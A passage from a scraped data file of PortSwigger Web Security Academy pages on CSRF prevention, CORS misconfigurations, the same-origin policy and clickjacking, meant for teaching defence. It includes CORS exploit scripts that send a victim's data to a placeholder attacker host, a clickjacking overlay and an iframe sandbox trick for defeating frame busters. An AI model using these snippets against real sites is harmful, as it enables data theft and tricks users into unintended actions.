cookies](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)\n*    [Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)\n    *   [Validation of Referer depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)\n    *   [Validation of Referer can be circumvented](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-can-be-circumvented)\n*    [Preventing CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing)\n    *    [CSRF tokens](https://portswigger.net/web-security/csrf/preventing#use-csrf-tokens)\n        *   [Generating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-generated)\n        *   [Transmitting](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-transmitted)\n        *   [Validating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-validated)\n    *   [Strict SameSite cookie restrictions](https://portswigger.net/web-security/csrf/preventing#use-strict-samesite-cookie-restrictions)\n    *   [Be wary of cross-origin, same-site attacks](https://portswigger.net/web-security/csrf/preventing#be-wary-of-cross-origin-same-site-attacks)\n*   [View all CSRF labs](https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [CSRF](https://portswigger.net/web-security/csrf)\n*   [How to prevent CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing)\n\nHow to prevent CSRF vulnerabilities\n===================================\n\nIn this section, we'll provide some high-level guidance on how you can protect your own websites from the kinds of vulnerabilities we've demonstrated in our [CSRF](https://portswigger.net/web-security/csrf) labs.\n\nUse CSRF tokens\n---------------\n\nThe most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token must meet the following criteria:\n\n*   Unpredictable with high entropy, as for session tokens in general.\n    \n*   Tied to the user's session.\n    \n*   Strictly validated in every case before the relevant action is executed.\n    \n\n### How should CSRF tokens be generated?\n\nCSRF tokens should contain significant entropy and be strongly unpredictable, with the same properties as session tokens in general.\n\nYou should use a cryptographically secure pseudo-random number generator (CSPRNG), seeded with the timestamp when it was created plus a static secret.\n\nIf you need further assurance beyond the strength of the CSPRNG, you can generate individual tokens by concatenating its output with some user-specific entropy and take a strong hash of the whole structure. This presents an additional barrier to an attacker who attempts to analyze the tokens based on a sample that are issued to them.\n\n### How should CSRF tokens be transmitted?\n\nCSRF tokens should be treated as secrets and handled in a secure manner throughout their lifecycle. An approach that is normally effective is to transmit the token to the client within a hidden field of an HTML form that is submitted using the POST method. The token will then be included as a request parameter when the form is submitted:\n\n`<input type=\"hidden\" name=\"csrf-token\" value=\"CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz\" />`For additional safety, the field containing the CSRF token should be placed as early as possible within the HTML document, ideally before any non-hidden input fields and before any locations where user-controllable data is embedded within the HTML. This mitigates against various techniques in which an attacker can use crafted data to manipulate the HTML document and capture parts of its contents.\n\nAn alternative approach, of placing the token into the URL query string, is somewhat less safe because the query string:\n\n*   Is logged in various locations on the client and server side;\n*   Is liable to be transmitted to third parties within the HTTP Referer header; and\n*   can be displayed on-screen within the user's browser.\n\nSome applications transmit CSRF tokens within a custom request header. This presents a further defense against an attacker who manages to predict or capture another user's token, because browsers do not normally allow custom headers to be sent cross-domain. However, the approach limits the application to making CSRF-protected requests using XHR (as opposed to HTML forms) and might be deemed over-complicated for many situations.\n\nCSRF tokens should not be transmitted within cookies.\n\n### How should CSRF tokens be validated?\n\nWhen a CSRF token is generated, it should be stored server-side within the user's session data. When a subsequent request is received that requires validation, the server-side application should verify that the request includes a token which matches the value that was stored in the user's session. This validation must be performed regardless of the HTTP method or content type of the request. If the request does not contain any token at all, it should be rejected in the same way as when an invalid token is present.\n\nUse Strict SameSite cookie restrictions\n---------------------------------------\n\nIn addition to implementing robust CSRF token validation, we recommend explicitly setting your own [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) restrictions with each cookie you issue. By doing so, you can control exactly which contexts the cookie will be used in, regardless of the browser.\n\nEven if all browsers eventually adopt the \"Lax-by-default\" policy, this isn't suitable for every cookie and can be more easily bypassed than `Strict` restrictions. In the meantime, the inconsistency between different browsers also means that only a subset of your users will benefit from any SameSite protections at all.\n\nIdeally, you should use the `Strict` policy by default, then lower this to `Lax` only if you have a good reason to do so. Never disable SameSite restrictions with `SameSite=None` unless you're fully aware of the security implications.\n\nBe wary of cross-origin, same-site attacks\n------------------------------------------\n\nAlthough properly configured SameSite restrictions provide good protection from cross-site attacks, it's vital to understand that they are completely powerless against cross-origin, same-site attacks.\n\nIf possible, we recommend isolating insecure content, such as user-uploaded files, on a separate site from any sensitive functionality or data. When testing a site, be sure to thoroughly audit all of the available attack surface belonging to the same site, including any of its sibling domains.\n\n", "category": "CSRF"}, {"title": "What is CORS?", "content": "In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks. This topic was written in collaboration with PortSwigger Research, who popularized this attack class with the presentation [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties).\n\nWhat is CORS (cross-origin resource sharing)?\n---------------------------------------------\n\nCross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy ([SOP](https://portswigger.net/web-security/cors/same-origin-policy)). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as [cross-site request forgery](https://portswigger.net/web-security/csrf) ([CSRF](https://portswigger.net/web-security/csrf)).\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind CORS vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all CORS labs](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)\n\nSame-origin policy\n------------------\n\nThe same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.\n\nRelaxation of the same-origin policy\n------------------------------------\n\nThe same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).\n\nThe cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.\n\nVulnerabilities arising from CORS configuration issues\n------------------------------------------------------\n\nMany modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.\n\nSome applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.\n\nOne way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:\n\n```\nGET /sensitive-victim-data HTTP/1.1\nHost: vulnerable-website.com\nOrigin: https://malicious-website.com\nCookie: sessionid=...\n```\n\nIt then responds with:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://malicious-website.com\nAccess-Control-Allow-Credentials: true\n...\n```\n\nThese headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.\n\nBecause the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:\n\n```\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n\tlocation='//malicious-website.com/log?key='+this.responseText;\n};\n```\n\nSome applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:\n\n```\nGET /data HTTP/1.1\nHost: normal-website.com\n...\nOrigin: https://innocent-website.com\n```\n\nThe application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:\n\n```\nHTTP/1.1 200 OK\n...\nAccess-Control-Allow-Origin: https://innocent-website.com\n```\n\nFor example, suppose an application grants access to all domains ending in:\n\n`normal-website.com`\n\nAn attacker might be able to gain access by registering the domain:\n\n`hackersnormal-website.com`\n\nAlternatively, suppose an application grants access to all domains beginning with\n\n`normal-website.com`\n\nAn attacker might be able to gain access using the domain:\n\n`normal-website.com.evil-user.net`\n\n### Whitelisted null origin value\n\nThe specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:\n\n*   Cross-origin redirects.\n*   Requests from serialized data.\n*   Request using the `file:` protocol.\n*   Sandboxed cross-origin requests.\n\nSome applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:\n\n```\nGET /sensitive-victim-data\nHost: vulnerable-website.com\nOrigin: null\n```\n\nAnd the server responds with:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n```\n\nIn this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:\n\n```\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\nlocation='malicious-website.com/log?key='+this.responseText;\n};\n</script>\"></iframe>\n```\n\n### Exploiting XSS via CORS trust relationships\n\nEven \"correctly\" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting ([XSS](https://portswigger.net/web-security/cross-site-scripting)), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.\n\nGiven the following request:\n\n```\nGET /api/requestApiKey HTTP/1.1\nHost: vulnerable-website.com\nOrigin: https://subdomain.vulnerable-website.com\nCookie: sessionid=...\n```\n\nIf the server responds with:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://subdomain.vulnerable-website.com\nAccess-Control-Allow-Credentials: true\n```\n\nThen an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:\n\n`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`\n\n### Breaking TLS with poorly configured CORS\n\nSuppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:\n\n```\nGET /api/requestApiKey HTTP/1.1\nHost: vulnerable-website.com\nOrigin: http://trusted-subdomain.vulnerable-website.com\nCookie: sessionid=...\n```\n\nThe application responds with:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com\nAccess-Control-Allow-Credentials: true\n```\n\nIn this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:\n\n*   The victim user makes any plain HTTP request.\n*   The attacker injects a redirection to:\n    \n    `http://trusted-subdomain.vulnerable-website.com`\n*   The victim's browser follows the redirect.\n*   The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:\n    \n    `https://vulnerable-website.com`\n*   The victim's browser makes the CORS request, including the origin:\n    \n    `http://trusted-subdomain.vulnerable-website.com`\n*   The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.\n*   The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.\n\nThis attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.\n\n### Intranets and CORS without credentials\n\nMost CORS attacks rely on the presence of the response header:\n\n`Access-Control-Allow-Credentials: true`\n\nWithout that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.\n\nHowever, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:\n\n```\nGET /reader?url=doc1.pdf\nHost: intranet.normal-website.com\nOrigin: https://normal-website.com\n```\n\nAnd the server responds with:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\n```\n\nThe application server is trusting resource requests from any origin without credentials. If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.\n\nHow to prevent CORS-based attacks\n---------------------------------\n\nCORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks.\n\n### Proper configuration of cross-origin requests\n\nIf a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header.\n\n### Only allow trusted sites\n\nIt may seem obvious but origins specified in the `Access-Control-Allow-Origin` header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.\n\n### Avoid whitelisting null\n\nAvoid using the header `Access-Control-Allow-Origin: null`. Cross-origin resource calls from internal documents and sandboxed requests can specify the `null` origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.\n\n### Avoid wildcards in internal networks\n\nAvoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.\n\n### CORS is not a substitute for server-side security policies\n\nCORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.\n\n#### Read more\n\n*   [Find CORS vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)\n*   [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)\n", "category": "CORS"}, {"title": "Same-origin policy (SOP)", "content": "### Cross-origin resource sharing (CORS)\n\n*   [What is CORS?](https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing)\n*    [Same-origin policy (SOP)](https://portswigger.net/web-security/cors/same-origin-policy)\n    *   [Why is SOP necessary?](https://portswigger.net/web-security/cors/same-origin-policy#why-is-the-same-origin-policy-necessary)\n    *   [Implementation](https://portswigger.net/web-security/cors/same-origin-policy#how-is-the-same-origin-policy-implemented)\n    *   [Relaxation of the SOP](https://portswigger.net/web-security/cors#relaxation-of-the-same-origin-policy)\n*    [Access-Control-Allow-Origin (ACAO) response header](https://portswigger.net/web-security/cors/access-control-allow-origin)\n    *   [Implementing simple CORS](https://portswigger.net/web-security/cors/access-control-allow-origin#implementing-simple-cross-origin-resource-sharing)\n    *   [Handling cross-origin resource requests with credentials](https://portswigger.net/web-security/cors/access-control-allow-origin#handling-cross-origin-resource-requests-with-credentials)\n    *   [Relaxation of CORS specifications with wildcards](https://portswigger.net/web-security/cors/access-control-allow-origin#relaxation-of-cors-specifications-with-wildcards)\n    *   [Pre-flight checks](https://portswigger.net/web-security/cors/access-control-allow-origin#pre-flight-checks)\n    *   [Does CORS protect against CSRF?](https://portswigger.net/web-security/cors/access-control-allow-origin#does-cors-protect-against-csrf)\n*    [Vulnerabilities](https://portswigger.net/web-security/cors#vulnerabilities-arising-from-cors-configuration-issues)\n    *   [Server-generated ACAO header from client-specified Origin header](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header)\n    *   [Errors parsing Origin headers](https://portswigger.net/web-security/cors#errors-parsing-origin-headers)\n    *   [Whitelisted null Origin value](https://portswigger.net/web-security/cors#whitelisted-null-origin-value)\n    *   [Exploiting XSS via CORS trust relationships](https://portswigger.net/web-security/cors#exploiting-xss-via-cors-trust-relationships)\n    *   [Breaking TLS with poorly configured CORS](https://portswigger.net/web-security/cors#breaking-tls-with-poorly-configured-cors)\n    *   [Intranets and CORS without credentials](https://portswigger.net/web-security/cors#intranets-and-cors-without-credentials)\n*   [Preventing attacks](https://portswigger.net/web-security/cors#how-to-prevent-cors-based-attacks)\n*   [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)\n*   [View all CORS labs](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [CORS](https://portswigger.net/web-security/cors)\n*   [Same-origin policy](https://portswigger.net/web-security/cors/same-origin-policy)\n\nSame-origin policy (SOP)\n========================\n\nIn this section we explain what the same-origin policy (SOP) is and how it is implemented.\n\nWhat is the same-origin policy?\n-------------------------------\n\nThe same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.\n\nThe same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number. For example, consider the following URL:\n\n`http://normal-website.com/example/example.html`This uses the scheme `http`, the domain `normal-website.com`, and the port number `80`. The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins:\n\nURL accessed\n\nAccess permitted?\n\n```\n\n                    http://normal-website.com/example/\n                \n```\n\nYes: same scheme, domain, and port\n\n```\n\n                    http://normal-website.com/example2/\n                \n```\n\nYes: same scheme, domain, and port\n\n```\n\n                    https://normal-website.com/example/\n                \n```\n\nNo: different scheme and port\n\n```\n\n                    http://en.normal-website.com/example/\n                \n```\n\nNo: different domain\n\n```\n\n                    http://www.normal-website.com/example/\n                \n```\n\nNo: different domain\n\n```\n\n                    http://normal-website.com:8080/example/\n                \n```\n\nNo: different port\\*\n\n\\*Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy.\n\nWhy is the same-origin policy necessary?\n----------------------------------------\n\nWhen a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.\n\nHow is the same-origin policy implemented?\n------------------------------------------\n\nThe same-origin policy generally controls the access that JavaScript code has to content that is loaded cross-domain. Cross-origin loading of page resources is generally permitted. For example, the SOP allows embedding of images via the `<img>` tag, media via the `<video>` tag and JavaScript includes with the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.\n\nThere are various exceptions to the same-origin policy:\n\n*   Some objects are writable but not readable cross-domain, such as the `location` object or the `location.href` property from iframes or new windows.\n*   Some objects are readable but not writable cross-domain, such as the `length` property of the `window` object (which stores the number of frames being used on the page) and the `closed` property.\n*   The `replace` function can generally be called cross-domain on the `location` object.\n*   You can call certain functions cross-domain. For example, you can call the functions `close`, `blur` and `focus` on a new window. The `postMessage` function can also be called on iframes and new windows in order to send messages from one domain to another.\n\nDue to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so they are often accessible from all subdomains of a site even though each subdomain is technically a different origin. You can partially mitigate this risk using the `HttpOnly` cookie flag.\n\nIt's possible to relax same-origin policy using `document.domain`. This special property allows you to relax SOP for a specific domain, but only if it's part of your FQDN (fully qualified domain name). For example, you might have a domain `marketing.example.com` and you would like to read the contents of that domain on `example.com`. To do so, both domains need to set `document.domain` to `example.com`. Then SOP will allow access between the two domains despite their different origins. In the past it was possible to set `document.domain` to a TLD such as `com`, which allowed access between any domains on the same TLD, but now modern browsers prevent this.\n\n", "category": "CORS"}, {"title": "Access-Control-Allow-Origin (ACAO) response header", "content": "#### Note\n\nNote that wildcards cannot be used within any other value. For example, the following header is **not** valid:\n\n`Access-Control-Allow-Origin: https://*.normal-website.com`\n\nFortunately, from a security perspective, the use of the wildcard is restricted in the specification as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies or client-side certificates). Consequently, a cross-domain server response of the form:\n\n```\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\nis not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone.\n\nGiven these constraints, some web servers dynamically create `Access-Control-Allow-Origin` headers based upon the client-specified origin. This is a workaround for CORS constraints that is not secure. We'll show you [how this can be exploited](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header) later.\n\nPre-flight checks\n-----------------\n\nThe pre-flight check was added to the CORS specification to protect legacy resources from the expanded request options allowed by CORS. Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check. The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.\n\nFor example, this is a pre-flight request that is seeking to use the `PUT` method together with a custom request header called `Special-Request-Header`:\n\n```\nOPTIONS /data HTTP/1.1\nHost: <some website>\n...\nOrigin: https://normal-website.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Special-Request-Header\n```\n\nThe server might return a response like the following:\n\n```\nHTTP/1.1 204 No Content\n...\nAccess-Control-Allow-Origin: https://normal-website.com\nAccess-Control-Allow-Methods: PUT, POST, OPTIONS\nAccess-Control-Allow-Headers: Special-Request-Header\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 240\n```\n\nThis response sets out the allowed methods (`PUT`, `POST` and `OPTIONS`) and permitted request headers (`Special-Request-Header`). In this particular case the cross-domain server also allows the sending of credentials, and the `Access-Control-Max-Age` header defines a maximum timeframe for caching the pre-flight response for reuse. If the request methods and headers are permitted (as they are in this example) then the browser processes the cross-origin request in the usual way. Pre-flight checks add an extra HTTP request round-trip to the cross-domain request, so they increase the browsing overhead.\n\nDoes CORS protect against CSRF?\n-------------------------------\n\nCORS does not provide protection against [cross-site request forgery](https://portswigger.net/web-security/csrf) ([CSRF](https://portswigger.net/web-security/csrf)) attacks, this is a common misconception.\n\nCORS is a controlled relaxation of the same-origin policy, so poorly configured CORS may actually increase the possibility of CSRF attacks or exacerbate their impact.\n\nThere are various ways to perform CSRF attacks without using CORS, including simple HTML forms and cross-domain resource includes.\n", "category": "CORS"}, {"title": "What is Clickjacking?", "content": "Clickjacking (UI redressing)\n----------------------------\n\nIn this section we will explain what clickjacking is, describe common examples of clickjacking attacks and discuss how to protect against these attacks.\n\nClickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Consider the following example:\n\nA web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content. This attack differs from a [CSRF](https://portswigger.net/web-security/csrf) attack in that the user is required to perform an action such as a button click whereas a [CSRF attack](https://portswigger.net/web-security/csrf) depends upon forging an entire request without the user's knowledge or input.\n\n!\n\nProtection against CSRF attacks is often provided by the use of a [CSRF token](https://portswigger.net/web-security/csrf#common-defences-against-csrf): a session-specific, single-use number or nonce. Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain. CSRF tokens are placed into requests and passed to the server as part of a normally behaved session. The difference compared to a normal user session is that the process occurs within a hidden iframe.\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind clickjacking vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all clickjacking labs](https://portswigger.net/web-security/all-labs#clickjacking)\n\nHow to construct a basic clickjacking attack\n--------------------------------------------\n\nClickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:\n\n```\n<head>\n\t<style>\n\t\t#target_website {\n\t\t\tposition:relative;\n\t\t\twidth:128px;\n\t\t\theight:128px;\n\t\t\topacity:0.00001;\n\t\t\tz-index:2;\n\t\t\t}\n\t\t#decoy_website {\n\t\t\tposition:absolute;\n\t\t\twidth:300px;\n\t\t\theight:400px;\n\t\t\tz-index:1;\n\t\t\t}\n\t</style>\n</head>\n...\n<body>\n\t<div id=\"decoy_website\">\n\t...decoy web content here...\n\t</div>\n\t<iframe id=\"target_website\" src=\"https://vulnerable-website.com\">\n\t</iframe>\n</body>\n```\n\nThe target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values. Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. The z-index determines the stacking order of the iframe and website layers. The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user. Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version 76 includes this behavior but Firefox does not). The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors.\n\n### Clickbandit\n\nAlthough you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. When you're testing for clickjacking in the wild, we recommend using Burp's [Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) tool instead. This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay. You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS.\n\nClickjacking with prefilled form input\n--------------------------------------\n\nSome websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission. Other websites might require text before form submission. As GET values form part of the URL then the target URL can be modified to incorporate values of the attacker's choosing and the transparent \"submit\" button is overlaid on the decoy site as in the basic clickjacking example.\n\nFrame busting scripts\n---------------------\n\nClickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:\n\n*   check and enforce that the current application window is the main or top window,\n*   make all frames visible,\n*   prevent clicking on invisible frames,\n*   intercept and flag potential clickjacking attacks to the user.\n\nFrame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:\n\n`<iframe id=\"victim_website\" src=\"https://victim-website.com\" sandbox=\"allow-forms\"></iframe>`\n\nBoth the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.\n\nCombining clickjacking with a DOM XSS attack\n--------------------------------------------\n\nSo far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting \"likes\" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the [XSS](https://portswigger.net/web-security/cross-site-scripting) exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.\n\nMultistep clickjacking\n----------------------\n\nAttacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.\n\nHow to prevent clickjacking attacks\n-----------------------------------\n\nWe have discussed a commonly encountered browser-side prevention mechanism, namely frame busting scripts. However, we have seen that it is often straightforward for an attacker to circumvent these protections. Consequently, server driven protocols have been devised that constrain browser iframe usage and mitigate against clickjacking.\n\nClickjacking is a browser-side behavior and its success or otherwise depends upon browser functionality and conformity to prevailing web standards and best practice. Server-side protection against clickjacking is provided by defining and communicating constraints over the use of components such as iframes. However, implementation of protection depends upon browser compliance and enforcement of these constraints. Two mechanisms for server-side clickjacking protection are X-Frame-Options and [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy).\n\n### X-Frame-Options\n\nX-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers. The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive:\n\n`X-Frame-Options: deny`\n\nAlternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive\n\n`X-Frame-Options: sameorigin`\n\nor to a named website using the `allow-from` directive:\n\n`X-Frame-Options: allow-from https://normal-website.com`\n\nX-Frame-Options is not implemented consistently across browsers (the `allow-from` directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.\n\n### Content Security Policy (CSP)\n\nContent Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the web server as a return header of the form:\n\n`Content-Security-Policy: policy`\n\nwhere policy is a string of policy directives separated by semicolons. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.\n\nThe recommended clickjacking protection is to incorporate the `frame-ancestors` directive in the application's Content Security Policy. The `frame-ancestors 'none'` directive is similar in behavior to the X-Frame-Options `deny` directive. The `frame-ancestors 'self'` directive is broadly equivalent to the 